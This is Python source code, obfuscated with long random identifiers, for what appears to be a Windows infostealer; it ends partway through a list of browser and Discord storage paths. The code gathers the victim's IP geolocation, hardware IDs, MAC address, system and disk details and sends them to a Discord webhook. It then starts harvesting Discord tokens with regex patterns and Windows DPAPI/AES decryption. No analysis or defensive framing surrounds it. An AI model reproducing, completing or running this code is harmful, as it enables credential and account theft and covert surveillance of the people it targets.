TEHMBLJHQXYXUPCCHKGUDBCDWFKUIKCYCOMQFIVNEIBLJZWCQIYFBZ    = MWFBHMGOZSBGUWZIYHPMGBYACLTIAGMHJMFVMHIXXSDKQNDJPXLJI(JMWLTCARHXDTFUMARQFTNOAKKWBCFSPJVVTYNHFDTXVHOMXPYZPLOFUZJYUFMHYROUCCYTPKCVSFJQIIYLWVRISGNFSQ, VLXQPBJPKGQKCTLNQNZYILVUOITMZHKJFLYXZXQFEUISKUKSECSFXECYOKZCVDBDAPZKQFQFLLOBZMKHKPCXOHYSB)

WAEQOZZXQLMVHIZGIXVGMZCIYWZJEAFDXSSFQILIEZSFKBVQJFI         = os.getenv("WINDIR", None).replace(" ", "%20")
BFACSUNBBCFFJETEOYNORLZIXPIDYLHLMLCCODAKCMDXMXZSUZNWSN     = os.getenv('USERPROFILE', None).replace(" ", "%20")
MNDEZLQCEHIKTXCZDXYHMKOLONQDLBWVPBGMUECODPBXMIGIROGJOJTXJKCSIWKKVNTBFFAQZRYTPZFDPUEOTBESZBUYL   = os.getenv('LOCALAPPDATA', None).replace(" ", "%20")
QXWJTXNXNIAETXDBNUPZIHNQZQMRNGIEGKFTUAPMXWIIHOWXTWTVLQWIOSOOIJDIXEQNEZMCGVNQUMLWFRM = os.getenv('APPDATA', None).replace(" ", "%20")

try:
    RUHCKMEWBOFDRYUCWDTMGGDQRJDEYQEYYQPTYTAXITMSWKSSDRRSVGIKEYKTZROIWQXIPRQSOGUQXAZEZDBRRUM = requests.get(f"https://{HHEMARVZDKRORFUTDGWXWMQGDFLDUVHIIXUAKAEOPFFNONWLWYGCQRDZAHVETTBXBZNSYIEPEMZQYLNMRCGAT}/api/ip/ip={TCMWHHLJKFTYETTJNQXBNATMYKDVVZWZFMSOMPDZMIKTDSGSWCJDQIJ}")
    ZGZSDJERGIOFKCTOHUPGAHALCAVTGMPRQGDZZIHTAUTQYYOJDKQNQJIMUR = RUHCKMEWBOFDRYUCWDTMGGDQRJDEYQEYYQPTYTAXITMSWKSSDRRSVGIKEYKTZROIWQXIPRQSOGUQXAZEZDBRRUM.json()

    ALZVCSXATHHDLGRUSGOAJGRDEJLCZBAGKENFTNVPKUUQKZALRQKKECNALCWXSXGWEHNDJVLRSICCOINEWNFLFJBOP = ZGZSDJERGIOFKCTOHUPGAHALCAVTGMPRQGDZZIHTAUTQYYOJDKQNQJIMUR.get('country', "None")
    ALZVCSXATHHDLGRUSGOAJGRDEJLCZBAGKENFTNVPKUUQKZALRQKKECNALCWXSXGWEHNDJVLRSICCOINEWNFLFJBOP_code = ZGZSDJERGIOFKCTOHUPGAHALCAVTGMPRQGDZZIHTAUTQYYOJDKQNQJIMUR.get('country_code', "None")
    AQEEWPXAKAYADXLNGBULPKDUFHWVMADGDIDNNDAPQSTQXMKNTERNASCSZZBFLBXZ = ZGZSDJERGIOFKCTOHUPGAHALCAVTGMPRQGDZZIHTAUTQYYOJDKQNQJIMUR.get('region', "None")
    AQEEWPXAKAYADXLNGBULPKDUFHWVMADGDIDNNDAPQSTQXMKNTERNASCSZZBFLBXZ_code = ZGZSDJERGIOFKCTOHUPGAHALCAVTGMPRQGDZZIHTAUTQYYOJDKQNQJIMUR.get('region_code', "None")
    ASXHOPIBRNIZULHVSDFHDOSRPKFXSZFMFBAREFFKETWWYKXBWDSACJRW = ZGZSDJERGIOFKCTOHUPGAHALCAVTGMPRQGDZZIHTAUTQYYOJDKQNQJIMUR.get('zip', "None")
    URAOWSMURSWQOFSZKBNEPMINGUISULCVPHZIWVIYUVTSBUCNZDGXO = ZGZSDJERGIOFKCTOHUPGAHALCAVTGMPRQGDZZIHTAUTQYYOJDKQNQJIMUR.get('city', "None")
    MAESYTFDFWFLNIISZDCFUDLXVOTWXZKUDMANMGBQDMXUYBCHGXW = ZGZSDJERGIOFKCTOHUPGAHALCAVTGMPRQGDZZIHTAUTQYYOJDKQNQJIMUR.get('latitude', "None")
    KORJYOATICAEAPOYDYTKTYNBFOMFNUKRJWJVEVCJJDEQEMXNTVQNQMKAGBVHDZHCWWJPPVVYFLRRSUNJFHUNICZKNS = ZGZSDJERGIOFKCTOHUPGAHALCAVTGMPRQGDZZIHTAUTQYYOJDKQNQJIMUR.get('longitude', "None")
    JDZCRQICZLCGMLKWTNLZJRZHOOYRYMDBUOKSAHREVOLXMBQEOGYEXNHBBMOMTRAFFZXBKQTEOIVAF = ZGZSDJERGIOFKCTOHUPGAHALCAVTGMPRQGDZZIHTAUTQYYOJDKQNQJIMUR.get('timezone', "None")
    CEAJZZZTMGTBLZHQJOGOGZRGOIRMOHPYNFFXKTFPAYCNHJXNZBAKLJABZKAQCNQYSHTKVTVDHEJUKKOTHMIZGLRVBNSTKNHRBMT = ZGZSDJERGIOFKCTOHUPGAHALCAVTGMPRQGDZZIHTAUTQYYOJDKQNQJIMUR.get('isp', "None")
    VDMOJBZNPIYHPANEHPJVURAFJZKVRAGOZBWMUQCYROGHZKNBBRHADVQXLVRWSUMSACGPYDBCFKJLUTUHCQQQMOQRDTSZTF = ZGZSDJERGIOFKCTOHUPGAHALCAVTGMPRQGDZZIHTAUTQYYOJDKQNQJIMUR.get('org', "None")
    TDUZFAYTJUNMOUNGPGYENPFIZNVBVEZRTLCPOWQMKPXGXROUYLNFIDVCTEHSMOTEJLNQSCTMNMKFAWQKMYOFYGBAGVOAJOYYDCJ = ZGZSDJERGIOFKCTOHUPGAHALCAVTGMPRQGDZZIHTAUTQYYOJDKQNQJIMUR.get('as', "None")
except:
    RUHCKMEWBOFDRYUCWDTMGGDQRJDEYQEYYQPTYTAXITMSWKSSDRRSVGIKEYKTZROIWQXIPRQSOGUQXAZEZDBRRUM = requests.get(f"http://ip-api.com/json/{TCMWHHLJKFTYETTJNQXBNATMYKDVVZWZFMSOMPDZMIKTDSGSWCJDQIJ}")
    ZGZSDJERGIOFKCTOHUPGAHALCAVTGMPRQGDZZIHTAUTQYYOJDKQNQJIMUR = RUHCKMEWBOFDRYUCWDTMGGDQRJDEYQEYYQPTYTAXITMSWKSSDRRSVGIKEYKTZROIWQXIPRQSOGUQXAZEZDBRRUM.json()

    ALZVCSXATHHDLGRUSGOAJGRDEJLCZBAGKENFTNVPKUUQKZALRQKKECNALCWXSXGWEHNDJVLRSICCOINEWNFLFJBOP = ZGZSDJERGIOFKCTOHUPGAHALCAVTGMPRQGDZZIHTAUTQYYOJDKQNQJIMUR.get('country', "None")
    ALZVCSXATHHDLGRUSGOAJGRDEJLCZBAGKENFTNVPKUUQKZALRQKKECNALCWXSXGWEHNDJVLRSICCOINEWNFLFJBOP_code = ZGZSDJERGIOFKCTOHUPGAHALCAVTGMPRQGDZZIHTAUTQYYOJDKQNQJIMUR.get('countryCode', "None")
    AQEEWPXAKAYADXLNGBULPKDUFHWVMADGDIDNNDAPQSTQXMKNTERNASCSZZBFLBXZ = ZGZSDJERGIOFKCTOHUPGAHALCAVTGMPRQGDZZIHTAUTQYYOJDKQNQJIMUR.get('regionName', "None")
    AQEEWPXAKAYADXLNGBULPKDUFHWVMADGDIDNNDAPQSTQXMKNTERNASCSZZBFLBXZ_code = ZGZSDJERGIOFKCTOHUPGAHALCAVTGMPRQGDZZIHTAUTQYYOJDKQNQJIMUR.get('region', "None")
    ASXHOPIBRNIZULHVSDFHDOSRPKFXSZFMFBAREFFKETWWYKXBWDSACJRW = ZGZSDJERGIOFKCTOHUPGAHALCAVTGMPRQGDZZIHTAUTQYYOJDKQNQJIMUR.get('zip', "None")
    URAOWSMURSWQOFSZKBNEPMINGUISULCVPHZIWVIYUVTSBUCNZDGXO = ZGZSDJERGIOFKCTOHUPGAHALCAVTGMPRQGDZZIHTAUTQYYOJDKQNQJIMUR.get('city', "None")
    MAESYTFDFWFLNIISZDCFUDLXVOTWXZKUDMANMGBQDMXUYBCHGXW = ZGZSDJERGIOFKCTOHUPGAHALCAVTGMPRQGDZZIHTAUTQYYOJDKQNQJIMUR.get('lat', "None")
    KORJYOATICAEAPOYDYTKTYNBFOMFNUKRJWJVEVCJJDEQEMXNTVQNQMKAGBVHDZHCWWJPPVVYFLRRSUNJFHUNICZKNS = ZGZSDJERGIOFKCTOHUPGAHALCAVTGMPRQGDZZIHTAUTQYYOJDKQNQJIMUR.get('lon', "None")
    JDZCRQICZLCGMLKWTNLZJRZHOOYRYMDBUOKSAHREVOLXMBQEOGYEXNHBBMOMTRAFFZXBKQTEOIVAF = ZGZSDJERGIOFKCTOHUPGAHALCAVTGMPRQGDZZIHTAUTQYYOJDKQNQJIMUR.get('timezone', "None")
    CEAJZZZTMGTBLZHQJOGOGZRGOIRMOHPYNFFXKTFPAYCNHJXNZBAKLJABZKAQCNQYSHTKVTVDHEJUKKOTHMIZGLRVBNSTKNHRBMT = ZGZSDJERGIOFKCTOHUPGAHALCAVTGMPRQGDZZIHTAUTQYYOJDKQNQJIMUR.get('isp', "None")
    VDMOJBZNPIYHPANEHPJVURAFJZKVRAGOZBWMUQCYROGHZKNBBRHADVQXLVRWSUMSACGPYDBCFKJLUTUHCQQQMOQRDTSZTF = ZGZSDJERGIOFKCTOHUPGAHALCAVTGMPRQGDZZIHTAUTQYYOJDKQNQJIMUR.get('org', "None")
    TDUZFAYTJUNMOUNGPGYENPFIZNVBVEZRTLCPOWQMKPXGXROUYLNFIDVCTEHSMOTEJLNQSCTMNMKFAWQKMYOFYGBAGVOAJOYYDCJ = ZGZSDJERGIOFKCTOHUPGAHALCAVTGMPRQGDZZIHTAUTQYYOJDKQNQJIMUR.get('as', "None")

def IAUNTQIYSOVFFSCPTXEKQHNCCZIVDLDSFZFIVCWMNJUBEBGKDNZVOVDQHQPEMOAMYLAFLRKYEOGBMWXIGXRF():
    import platform
    import subprocess
    import uuid
    import psutil
    import GPUtil
    import ctypes
    import win32api
    import string
    import screeninfo
    from discord import SyncWebhook, Embed

    try: BDRYQQXXKSMCNLVSKYXEBMYQGPLCYJLYJQQNQCZARKVSOSBCJEDWBPYXSWDGVWVOOSFX = {platform.system()}
    except: BDRYQQXXKSMCNLVSKYXEBMYQGPLCYJLYJQQNQCZARKVSOSBCJEDWBPYXSWDGVWVOOSFX = "None"

    try: NYZOPNHFTLYUJCBTSBEUTTRJKCTTQAKKFFQABHDCULFKHGNRNBUXBEVXIUDSARMYQQZJZSNNUZSWLHZJMMZKQMBUTCYHJUQFFLV = platform.version()
    except: NYZOPNHFTLYUJCBTSBEUTTRJKCTTQAKKFFQABHDCULFKHGNRNBUXBEVXIUDSARMYQQZJZSNNUZSWLHZJMMZKQMBUTCYHJUQFFLV = "None"

    try: FBAKVLIGSMHREHGGMMEVMCLQFNYXRIJBTXGPJAWYDNHYQNIJVNCNFBHWWRKUQBISGLTH = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
    except: FBAKVLIGSMHREHGGMMEVMCLQFNYXRIJBTXGPJAWYDNHYQNIJVNCNFBHWWRKUQBISGLTH = "None"

    try: KPJGXFRJNEMRYMAEOYRDYECFONFSLSKWHXQFFAOSYONYHNBCCUZ = subprocess.check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
    except: KPJGXFRJNEMRYMAEOYRDYECFONFSLSKWHXQFFAOSYONYHNBCCUZ = "None"

    try: DOKPDTCQCZFQJEGTKIEIMWSWTMPBHQRUHNYBJEANZIZMLOMCZRTWOFLFLICGAHPXWDUMDLTRYPPMQLHYZDIKJOQGHTVOLPPJ = round(psutil.virtual_memory().total / (1024**3), 2)
    except: DOKPDTCQCZFQJEGTKIEIMWSWTMPBHQRUHNYBJEANZIZMLOMCZRTWOFLFLICGAHPXWDUMDLTRYPPMQLHYZDIKJOQGHTVOLPPJ = "None"

    try: DBQZHHBDFHMVKYCUHNAQDGDGCHKSWZJVBEDDOUQJXXTFOHQXABWPIMYMGTEVBOXBDIQZI = platform.processor()
    except: DBQZHHBDFHMVKYCUHNAQDGDGCHKSWZJVBEDDOUQJXXTFOHQXABWPIMYMGTEVBOXBDIQZI = "None"

    try: WYDLNPUBEKACXCWXBENEVYPZMKLTARRLERCDHOUHQXMJLENZVTQOVDEGHPZOQP = psutil.cpu_count(logical=False)
    except: WYDLNPUBEKACXCWXBENEVYPZMKLTARRLERCDHOUHQXMJLENZVTQOVDEGHPZOQP = "None"

    try: PYOOXKCCMTGKXIEYCLOGYKWDXQFGCNWMHJGKWCAQLMWOLCFCFALUSGMQLBHTWFLUOHT = GPUtil.getGPUs()[0].name if GPUtil.getGPUs() else "None"
    except: PYOOXKCCMTGKXIEYCLOGYKWDXQFGCNWMHJGKWCAQLMWOLCFCFALUSGMQLBHTWFLUOHT = "None"

    try:
        SBGQEDLKVNIVEOGWTTCGDEHIJEGBKMJABWPFEYJDKTWWIDHKGSMPQGUKVCKXX = []
        JFUOEYSTMLDMOSAPSWHFBKFWJFMKSRPIFMWYWCPEPXSDAVJNLFVVKPZTORYJUUWFJUX = ctypes.windll.kernel32.GetLogicalDrives()
        for v4r_letter in string.ascii_uppercase:
            if JFUOEYSTMLDMOSAPSWHFBKFWJFMKSRPIFMWYWCPEPXSDAVJNLFVVKPZTORYJUUWFJUX & 1:
                XJKKYJYBRBEINTHYQWLYDXYOUXMNISVTDVFZTIPRFQZWVGTIYWUIAIWOAERLNFRJWRNCARPXZHIWZIAZ = v4r_letter + ":\\"
                try:
                    AUXQGPSQYEMILZIFBWOKOHMVVRWUDKHXNAJTHJDATDOEHWPAZJMVP = ctypes.c_ulonglong(0)
                    NUBSRMPMTIRROVCWODXDQYZKSEVZBHFXJEJNJQCCLKGZFLBMMCPWHZQ = ctypes.c_ulonglong(0)
                    ctypes.windll.kernel32.GetDiskFreeSpaceExW(ctypes.c_wchar_p(XJKKYJYBRBEINTHYQWLYDXYOUXMNISVTDVFZTIPRFQZWVGTIYWUIAIWOAERLNFRJWRNCARPXZHIWZIAZ), None, ctypes.pointer(NUBSRMPMTIRROVCWODXDQYZKSEVZBHFXJEJNJQCCLKGZFLBMMCPWHZQ), ctypes.pointer(AUXQGPSQYEMILZIFBWOKOHMVVRWUDKHXNAJTHJDATDOEHWPAZJMVP))
                    XCRFRVDXRHHOPABHKODZWUVLSOOLNIKUKUNNYFXNPEDAKIOBVBIUADVINUZJSTKUKYODKGTAYMBXXN = NUBSRMPMTIRROVCWODXDQYZKSEVZBHFXJEJNJQCCLKGZFLBMMCPWHZQ.value
                    VVRIXIQENUEWFGHDZHGTMTPJFHJAWBUJNWYMPJSBQTZETRYQRITVYGSRJZFVUCFXYBVUVNGUHATOS = AUXQGPSQYEMILZIFBWOKOHMVVRWUDKHXNAJTHJDATDOEHWPAZJMVP.value
                    CKAKIXNYCMTXAYKWZSXNVHDBSNOGBWSOBSFAIZHYZUPNDDUTNCUGCHFHGHBYYNOWYJSWGHKXYBSVIEQPSYBKNSXYPFDWSSBA = XCRFRVDXRHHOPABHKODZWUVLSOOLNIKUKUNNYFXNPEDAKIOBVBIUADVINUZJSTKUKYODKGTAYMBXXN - VVRIXIQENUEWFGHDZHGTMTPJFHJAWBUJNWYMPJSBQTZETRYQRITVYGSRJZFVUCFXYBVUVNGUHATOS
                    FXRYSRVUSAXUZQONFQUDYFGCUWCWYKUHXTBZBWHUXRVYXNZBJWHTHWVUHQVZYTYHB = win32api.GetVolumeInformation(XJKKYJYBRBEINTHYQWLYDXYOUXMNISVTDVFZTIPRFQZWVGTIYWUIAIWOAERLNFRJWRNCARPXZHIWZIAZ)[0]
                    drive = {
                        'drive': XJKKYJYBRBEINTHYQWLYDXYOUXMNISVTDVFZTIPRFQZWVGTIYWUIAIWOAERLNFRJWRNCARPXZHIWZIAZ,
                        'total': XCRFRVDXRHHOPABHKODZWUVLSOOLNIKUKUNNYFXNPEDAKIOBVBIUADVINUZJSTKUKYODKGTAYMBXXN,
                        'free': VVRIXIQENUEWFGHDZHGTMTPJFHJAWBUJNWYMPJSBQTZETRYQRITVYGSRJZFVUCFXYBVUVNGUHATOS,
                        'used': CKAKIXNYCMTXAYKWZSXNVHDBSNOGBWSOBSFAIZHYZUPNDDUTNCUGCHFHGHBYYNOWYJSWGHKXYBSVIEQPSYBKNSXYPFDWSSBA,
                        'name': FXRYSRVUSAXUZQONFQUDYFGCUWCWYKUHXTBZBWHUXRVYXNZBJWHTHWVUHQVZYTYHB,
                    }
                    SBGQEDLKVNIVEOGWTTCGDEHIJEGBKMJABWPFEYJDKTWWIDHKGSMPQGUKVCKXX.append(drive)
                except:
                    ()
            JFUOEYSTMLDMOSAPSWHFBKFWJFMKSRPIFMWYWCPEPXSDAVJNLFVVKPZTORYJUUWFJUX >>= 1

        ZFKKYYTXABCEWBIMOVCPQCRGDCOHKJSFTNHEATFAPIQXPRVGONZROEZSTGRTCPIISMDUZLWXNXZLFSLENCABSAVJQKPZHBTTFDYS = "{:<7} {:<10} {:<10} {:<10} {:<20}\n".format("Drive:", "Free:", "Total:", "Use:", "Name:")
        for v4r_drive in SBGQEDLKVNIVEOGWTTCGDEHIJEGBKMJABWPFEYJDKTWWIDHKGSMPQGUKVCKXX:
            BCHEYCEZAQUYAHNDVCOVDQGDLCOGNUHOJMDKRHIWXPTILVTJAPLAUMAL = (v4r_drive['used'] / v4r_drive['total']) * 100
            VVRIXIQENUEWFGHDZHGTMTPJFHJAWBUJNWYMPJSBQTZETRYQRITVYGSRJZFVUCFXYBVUVNGUHATOS_gb = "{:.2f}GO".format(v4r_drive['free'] / (1024 ** 3))
            XCRFRVDXRHHOPABHKODZWUVLSOOLNIKUKUNNYFXNPEDAKIOBVBIUADVINUZJSTKUKYODKGTAYMBXXN_gb = "{:.2f}GO".format(v4r_drive['total'] / (1024 ** 3))
            BCHEYCEZAQUYAHNDVCOVDQGDLCOGNUHOJMDKRHIWXPTILVTJAPLAUMAL_str = "{:.2f}%".format(BCHEYCEZAQUYAHNDVCOVDQGDLCOGNUHOJMDKRHIWXPTILVTJAPLAUMAL)
            ZFKKYYTXABCEWBIMOVCPQCRGDCOHKJSFTNHEATFAPIQXPRVGONZROEZSTGRTCPIISMDUZLWXNXZLFSLENCABSAVJQKPZHBTTFDYS += "{:<7} {:<10} {:<10} {:<10} {:<20}".format(v4r_drive['drive'], 
                                                                   VVRIXIQENUEWFGHDZHGTMTPJFHJAWBUJNWYMPJSBQTZETRYQRITVYGSRJZFVUCFXYBVUVNGUHATOS_gb,
                                                                   XCRFRVDXRHHOPABHKODZWUVLSOOLNIKUKUNNYFXNPEDAKIOBVBIUADVINUZJSTKUKYODKGTAYMBXXN_gb,
                                                                   BCHEYCEZAQUYAHNDVCOVDQGDLCOGNUHOJMDKRHIWXPTILVTJAPLAUMAL_str,
                                                                   v4r_drive['name'])
    except:
        ZFKKYYTXABCEWBIMOVCPQCRGDCOHKJSFTNHEATFAPIQXPRVGONZROEZSTGRTCPIISMDUZLWXNXZLFSLENCABSAVJQKPZHBTTFDYS = """Drive:  Free:      Total:     Use:       Name:       
None    None       None       None       None     
"""

    try:
        def IsPortable():
            try:
                battery = psutil.sensors_battery()
                return battery is not None and battery.power_plugged is not None
            except AttributeError:
                return False

        if IsPortable():
            EAHNYZDQCKXISNZZJSPYNBGHGMPUFMITEMXPJTISKJUUVPIPJDBRKXCJSLZXUAEVTKCGJGOFMAEIZZFPREWNHUUGTNORL = 'Pc Portable'
        else:
            EAHNYZDQCKXISNZZJSPYNBGHGMPUFMITEMXPJTISKJUUVPIPJDBRKXCJSLZXUAEVTKCGJGOFMAEIZZFPREWNHUUGTNORL = 'Pc Fixed'
    except:
        EAHNYZDQCKXISNZZJSPYNBGHGMPUFMITEMXPJTISKJUUVPIPJDBRKXCJSLZXUAEVTKCGJGOFMAEIZZFPREWNHUUGTNORL = "None"

    try: KZAIFKAOHJRTJLCFELNXYPGIVDTRZTSCLAAKRJZPQFMTFECLEANWPVYKJQKLN = len(screeninfo.get_monitors())
    except: KZAIFKAOHJRTJLCFELNXYPGIVDTRZTSCLAAKRJZPQFMTFECLEANWPVYKJQKLN = "None"

    embed = Embed(title=f'System Info {JVQTLDADTYXKYZHMXTKHPNYLFIGLMMMLYWLGZYSTPVADECBDSENXNOQZXQKIRPEMBYFMICHEXRUQRVVCYKIJKDAZ}:', color=UZWWSUMHOOULCLVGSESALXIRPLUVNUMSHAYWLKTQUQPYJKZZAJTLG)

    embed.add_field(name=":bust_in_silhouette: User Pc:", value=f"""```Hostname    : {JYRKJPOHCTTXXWZTTWJXOSDYRKMKNEZVAHSTOGRMEIEKAFXLAVDLDLKDRPIMUWPTZEKY}
Username    : {IGGQEJLCJEPBNULVOGOEMHPSIDCFUPXIVMWYOBYJTNQUXSWJPQBVHOQENIFMPHQPAIMRKVQODFUTMUSUEFKJIPYUB}
DisplayName : {NJQUIPVQDTOAHOJZOWWCYGWXXLOUWUJNYFSYJXYUINZQBMRFZUYLLODYZPUHLCNITKJISLXIQBLASNXBIYDTL}```""", inline=False)

    embed.add_field(name=":computer: System:", value=f"""```Plateform     : {EAHNYZDQCKXISNZZJSPYNBGHGMPUFMITEMXPJTISKJUUVPIPJDBRKXCJSLZXUAEVTKCGJGOFMAEIZZFPREWNHUUGTNORL}
Exploitation  : {BDRYQQXXKSMCNLVSKYXEBMYQGPLCYJLYJQQNQCZARKVSOSBCJEDWBPYXSWDGVWVOOSFX} {NYZOPNHFTLYUJCBTSBEUTTRJKCTTQAKKFFQABHDCULFKHGNRNBUXBEVXIUDSARMYQQZJZSNNUZSWLHZJMMZKQMBUTCYHJUQFFLV}
Screen Number : {KZAIFKAOHJRTJLCFELNXYPGIVDTRZTSCLAAKRJZPQFMTFECLEANWPVYKJQKLN}

HWID : {KPJGXFRJNEMRYMAEOYRDYECFONFSLSKWHXQFFAOSYONYHNBCCUZ}
MAC  : {FBAKVLIGSMHREHGGMMEVMCLQFNYXRIJBTXGPJAWYDNHYQNIJVNCNFBHWWRKUQBISGLTH}
CPU  : {DBQZHHBDFHMVKYCUHNAQDGDGCHKSWZJVBEDDOUQJXXTFOHQXABWPIMYMGTEVBOXBDIQZI}, {WYDLNPUBEKACXCWXBENEVYPZMKLTARRLERCDHOUHQXMJLENZVTQOVDEGHPZOQP} Core
GPU  : {PYOOXKCCMTGKXIEYCLOGYKWDXQFGCNWMHJGKWCAQLMWOLCFCFALUSGMQLBHTWFLUOHT}
RAM  : {DOKPDTCQCZFQJEGTKIEIMWSWTMPBHQRUHNYBJEANZIZMLOMCZRTWOFLFLICGAHPXWDUMDLTRYPPMQLHYZDIKJOQGHTVOLPPJ}Go```""", inline=False)

    embed.add_field(name=":satellite: Ip:", value=f"""```Public : {TCMWHHLJKFTYETTJNQXBNATMYKDVVZWZFMSOMPDZMIKTDSGSWCJDQIJ}
Local  : {BFWEFYVFGHRKUTBDNMTLUFFEKPOPYYGFUJWHMRFXGRQLSZIFPAYPBRWGBAZDRLGTVZPHMCWYDWQGEOXHWIVJYAVOSZCXMC}
Isp    : {CEAJZZZTMGTBLZHQJOGOGZRGOIRMOHPYNFFXKTFPAYCNHJXNZBAKLJABZKAQCNQYSHTKVTVDHEJUKKOTHMIZGLRVBNSTKNHRBMT}
Org    : {VDMOJBZNPIYHPANEHPJVURAFJZKVRAGOZBWMUQCYROGHZKNBBRHADVQXLVRWSUMSACGPYDBCFKJLUTUHCQQQMOQRDTSZTF}
As     : {TDUZFAYTJUNMOUNGPGYENPFIZNVBVEZRTLCPOWQMKPXGXROUYLNFIDVCTEHSMOTEJLNQSCTMNMKFAWQKMYOFYGBAGVOAJOYYDCJ}```""", inline=False)

    embed.add_field(name=":minidisc: Disk:", value=f"""```{ZFKKYYTXABCEWBIMOVCPQCRGDCOHKJSFTNHEATFAPIQXPRVGONZROEZSTGRTCPIISMDUZLWXNXZLFSLENCABSAVJQKPZHBTTFDYS}```""", inline=False)

    embed.add_field(name=":map: Location:", value=f"""```Country   : {ALZVCSXATHHDLGRUSGOAJGRDEJLCZBAGKENFTNVPKUUQKZALRQKKECNALCWXSXGWEHNDJVLRSICCOINEWNFLFJBOP} ({ALZVCSXATHHDLGRUSGOAJGRDEJLCZBAGKENFTNVPKUUQKZALRQKKECNALCWXSXGWEHNDJVLRSICCOINEWNFLFJBOP_code})
Region    : {AQEEWPXAKAYADXLNGBULPKDUFHWVMADGDIDNNDAPQSTQXMKNTERNASCSZZBFLBXZ} ({AQEEWPXAKAYADXLNGBULPKDUFHWVMADGDIDNNDAPQSTQXMKNTERNASCSZZBFLBXZ_code})
Zip       : {ASXHOPIBRNIZULHVSDFHDOSRPKFXSZFMFBAREFFKETWWYKXBWDSACJRW}
City      : {URAOWSMURSWQOFSZKBNEPMINGUISULCVPHZIWVIYUVTSBUCNZDGXO}
Timezone  : {JDZCRQICZLCGMLKWTNLZJRZHOOYRYMDBUOKSAHREVOLXMBQEOGYEXNHBBMOMTRAFFZXBKQTEOIVAF}
Latitude  : {MAESYTFDFWFLNIISZDCFUDLXVOTWXZKUDMANMGBQDMXUYBCHGXW}
Longitude : {KORJYOATICAEAPOYDYTKTYNBFOMFNUKRJWJVEVCJJDEQEMXNTVQNQMKAGBVHDZHCWWJPPVVYFLRRSUNJFHUNICZKNS}```""", inline=False)


    embed.set_footer(text=ZEGRRDVSQIYWYKBGRMSNAHPPITRVDSABIATRSVBWNGINWGLPWBTONTBGLGWGSCKWTLLBAIKBDJLFYYWRXG, icon_url=CBYRGELXUIKPDUYMNSQBQLNDULQQYOPBNPSOXFDVQPHZFNRXGATNHUGJSNOMFDGYHBVMQGSKZJENFVSZTZXQCZZSW)

    OQVNJZGZEZGGYFVTIJBUPKNPLVEYQAUXNKDLUSMNVSEEKXEOCZSHNSAEER = SyncWebhook.from_url(TEHMBLJHQXYXUPCCHKGUDBCDWFKUIKCYCOMQFIVNEIBLJZWCQIYFBZ)
    OQVNJZGZEZGGYFVTIJBUPKNPLVEYQAUXNKDLUSMNVSEEKXEOCZSHNSAEER.send(embed=embed, username=PDHSHFGMMAJVSNBRHNDWCMJWDPOAITBFFSIMKXJQVHZPDCZGEONVALVPYKGUJGGNZXNHODXU, avatar_url=CBYRGELXUIKPDUYMNSQBQLNDULQQYOPBNPSOXFDVQPHZFNRXGATNHUGJSNOMFDGYHBVMQGSKZJENFVSZTZXQCZZSW)

def VZOMEPYVBTOOMMPVFJBQPPLJDCPKBPVLCGQSRFAHQEYLPNBQNQHAOGHJBVCUKFVFTPJEXZUIA():
    import os
    import re
    import json
    import base64
    import requests
    from Cryptodome.Cipher import AES
    from win32crypt import CryptUnprotectData
    from discord import SyncWebhook, Embed

    def LCSWYHJTVSCTUCTLOBZOIBJRPMTGVCOCKXBRCWYGIUSYXLUAIYFQYU():
        UNYLQFDPSVZELCIWSPZZLIQCZUFDRMJGXMGLZADRRTSFEXOVUEDKTMOJMXDJDVOJPQASRSIYC = "https://discord.com/api/v9/users/@me"
        IVLJTTQSQEEWUZQFLELOAPMVOHPQLWODEWFMDSBJMUTCQOGEYZKYRSMDMS = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        IVLJTTQSQEEWUZQFLELOAPMVOHPQLWODEWFMDSBJMUTCQOGEYZKYRSMDMS_enc = r"dQw4w9WgXcQ:[^\"]*"
        NCDQLCFMLMUUIVCXSQTSIJQDWMULQHNZAMPONUYLOEUKOWNQIQBMWFNAZDHKRBXAULWMQUQRAI = []
        IMAVOQZGNJDTGNOEBNZIANABHEDZPCCMQJCIBWVYBJVMHZCTCNVJCTCHNIHGBMZUJLUBNMUKGOEZPRRWRATNPQ = []
        CLATUSVHYUXYBHCWLUKVCRQASYMIABFHNGRCIFAXRVVVTGRWJPUJX = {}

        YKCPUBYANFDCFMXICCQXENZLRRDLWPOAIKCGBAIRNYQOUBGSLXLXOJBJIASVIFOWZLEDTJGII = {
            'Discord': QXWJTXNXNIAETXDBNUPZIHNQZQMRNGIEGKFTUAPMXWIIHOWXTWTVLQWIOSOOIJDIXEQNEZMCGVNQUMLWFRM + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': QXWJTXNXNIAETXDBNUPZIHNQZQMRNGIEGKFTUAPMXWIIHOWXTWTVLQWIOSOOIJDIXEQNEZMCGVNQUMLWFRM + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': QXWJTXNXNIAETXDBNUPZIHNQZQMRNGIEGKFTUAPMXWIIHOWXTWTVLQWIOSOOIJDIXEQNEZMCGVNQUMLWFRM + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': QXWJTXNXNIAETXDBNUPZIHNQZQMRNGIEGKFTUAPMXWIIHOWXTWTVLQWIOSOOIJDIXEQNEZMCGVNQUMLWFRM + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': QXWJTXNXNIAETXDBNUPZIHNQZQMRNGIEGKFTUAPMXWIIHOWXTWTVLQWIOSOOIJDIXEQNEZMCGVNQUMLWFRM + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': QXWJTXNXNIAETXDBNUPZIHNQZQMRNGIEGKFTUAPMXWIIHOWXTWTVLQWIOSOOIJDIXEQNEZMCGVNQUMLWFRM + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': MNDEZLQCEHIKTXCZDXYHMKOLONQDLBWVPBGMUECODPBXMIGIROGJOJTXJKCSIWKKVNTBFFAQZRYTPZFDPUEOTBESZBUYL + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': MNDEZLQCEHIKTXCZDXYHMKOLONQDLBWVPBGMUECODPBXMIGIROGJOJTXJKCSIWKKVNTBFFAQZRYTPZFDPUEOTBESZBUYL + '\\Torch\\User Data\\Local Storage\\leveldb\\',
